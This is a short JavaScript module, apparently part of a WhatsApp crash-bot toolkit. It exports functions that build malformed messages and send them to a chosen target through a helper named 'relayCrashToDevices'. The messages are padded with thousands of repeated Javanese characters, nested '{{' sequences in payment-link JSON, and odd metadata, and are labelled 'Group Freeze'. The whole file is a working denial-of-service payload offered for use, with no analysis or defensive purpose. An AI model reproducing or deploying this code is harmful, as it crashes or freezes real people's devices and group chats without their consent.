const { relayCrashToDevices } = require('../target-utils');

async function xgcs(SYxS7, target) {
    const msg = {
        extendedTextMessage: {
            text: "Group Freeze " + "ꦾ".repeat(1000),
            matchedText: "https://t.me/devor6core",
            description: "",
            title: "Group Freeze",
            paymentLinkMetadata: {
                button: { displayText: "JOIN" },
                header: { headerType: 1 },
                provider: { paramsJson: JSON.stringify({ code: "{{".repeat(200) }) }
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "JOIN" },
                    header: { headerType: 1 },
                    provider: { paramsJson: JSON.stringify({ code: "{{".repeat(200) }) }
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221
            }
        }
    };

    try {
        return await relayCrashToDevices(SYxS7, target, {
            groupStatusMessageV2: {
                message: msg
            }
        });
    } catch (error) {
        console.log(`[ 🗑️ ] Error on message: ${error.message}`);
        return { success: false, deliveredCount: 0, errors: [error.message] };
    }
}

async function xgc(sam, target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: '33333333333333333@newsletter',
                        newsletterName: "Group Freeze " + "ꦾ".repeat(2000),
                        jpegThumbnail: null,
                        caption: "ꦽ".repeat(2000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        return await relayCrashToDevices(sam, target, messsage);
    } catch (err) {
        console.log(err);
        return { success: false, deliveredCount: 0, errors: [err.message] };
    }
}

module.exports = { gcFrz: xgcs, xgcs, xgc };
